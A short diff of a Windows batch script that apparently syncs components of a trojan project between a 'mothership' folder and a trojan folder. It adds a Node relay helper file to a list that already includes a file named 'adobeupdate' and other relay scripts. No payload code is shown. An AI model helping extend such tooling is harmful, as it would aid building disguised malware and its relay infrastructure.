@@ -1,5 +1,7 @@
 setlocal enabledelayedexpansion
 
+set update=false
+
 FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"
 
 set mothershipdir=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
@@ -25,8 +27,10 @@ set nodehostrelay=%trojandir%\nodehostrelay.js
 set mnodehostrelay=%mothershipdir%\nodehostrelay.js
 set nodehostrelaycmds=%trojandir%\nodehostrelay.cmdslist.js
 set mnodehostrelaycmds=%mothershipdir%\nodehostrelay.cmdslist.js
+set nodehostrelayhelper=%trojandir%\nodehostrelayhelper.js
+set mnodehostrelayhelper=%mothershipdir%\nodehostrelayhelper.js
 
-set files_list=adobeupdate pythonrelay pythonhostrelay nodehostrelay nodehostrelaycmds
+set files_list=adobeupdate pythonrelay pythonhostrelay nodehostrelay nodehostrelaycmds nodehostrelayhelper
 
 @echo off
 color 0A
